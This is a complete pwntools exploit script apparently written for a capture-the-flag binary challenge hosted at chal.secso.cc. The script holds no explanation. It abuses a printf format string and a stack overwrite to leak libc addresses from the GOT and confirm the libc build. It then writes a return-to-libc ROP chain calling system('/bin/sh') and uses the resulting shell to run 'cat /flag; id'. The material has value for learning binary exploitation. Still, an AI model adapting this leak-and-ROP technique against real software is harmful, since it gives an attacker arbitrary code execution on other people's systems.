#!/usr/bin/env python3
import sys
import time

from pwn import ELF, context, log, p64, process, remote, u64

context.log_level = "warn"

HOST, PORT = "chal.secso.cc", 4006
REMOTE = "--remote" in sys.argv
INTERACTIVE = "-i" in sys.argv

elf = ELF("chal", checksec=False)

MAIN = elf.sym.main
PRINTF_PLT = 0x4010D0
RET = 0x40101A
NUL = bytes([0])

RET_OFF = 88
ARG6_OFF = 104

if REMOTE:
    LIBC_PATH, POP_RDI_OFF = "remote/libc.so.6", 0x2A145
else:
    LIBC_PATH, POP_RDI_OFF = "/usr/lib/x86_64-linux-gnu/libc.so.6", 0x2A9B7
libc = ELF(LIBC_PATH, checksec=False)

LEAK_SYM, VERIFY_SYM = "read", "puts"


def connect():
    return remote(HOST, PORT) if REMOTE else process("./chal")


def prompt(io):
    return io.recvuntil(b">> ", timeout=8)


def send(io, payload):
    io.send(payload)
    time.sleep(0.12)
    return prompt(io)


def set_qword(io, off, value):
    raw = p64(value)
    z = raw.find(NUL)

    if z == -1 or not any(raw[z:]):
        send(io, b"AAAA".ljust(off, b"B") + raw)
        return

    prime = bytes(c if c else ord("Q") for c in raw[:6])
    send(io, b"AAAA".ljust(off, b"B") + prime + NUL * 2)
    for i in sorted((i for i in range(6) if raw[i] == 0), reverse=True):
        send(io, b"AAAA".ljust(off, b"B") + prime[:i] + NUL)


def leak(io, got_addr):
    set_qword(io, ARG6_OFF, got_addr)
    set_qword(io, 96, MAIN)
    io.send(b"exit%6$s".ljust(RET_OFF, b"B") + p64(PRINTF_PLT))
    time.sleep(0.25)

    out = io.recvuntil(b">> ", timeout=8)
    body = out.split(b"exit", 1)[1]
    return u64(body[: body.index(b"BBBB")].ljust(8, NUL))


def exploit(extra_ret):
    io = connect()
    prompt(io)

    base = leak(io, elf.got[LEAK_SYM]) - libc.sym[LEAK_SYM]
    assert base & 0xFFF == 0, "libc base %#x is not page-aligned" % base
    off = leak(io, elf.got[VERIFY_SYM]) - base
    assert off == libc.sym[VERIFY_SYM], "wrong libc: %s off %#x" % (VERIFY_SYM, off)
    log.success("libc base = %#x  (%s profile verified)" % (base, LIBC_PATH))

    chain = [
        base + POP_RDI_OFF,
        base + next(libc.search(b"/bin/sh" + NUL)),
        base + libc.sym["system"],
    ]
    if extra_ret:
        chain.insert(0, RET)

    for i, value in reversed(list(enumerate(chain[1:], start=1))):
        set_qword(io, RET_OFF + 8 * i, value)
    io.send(b"exit".ljust(RET_OFF, b"B") + p64(chain[0]))
    time.sleep(0.4)
    return io


def main():
    for extra_ret in (False, True):
        io = None
        try:
            io = exploit(extra_ret)
            io.sendline(b"echo SHELL_OK; cat /flag; id")
            io.recvuntil(b"SHELL_OK", timeout=6)
            log.success("shell (extra ret = %s)" % extra_ret)
            if INTERACTIVE:
                io.interactive()
            else:
                print(io.recvrepeat(2).decode("utf-8", "replace").strip())
            return
        except Exception as exc:
            log.warn("extra_ret=%s failed: %s: %s" % (extra_ret, type(exc).__name__, exc))
            if io:
                try:
                    io.close()
                except Exception:
                    pass
    log.error("both alignment variants failed")


if __name__ == "__main__":
    main()
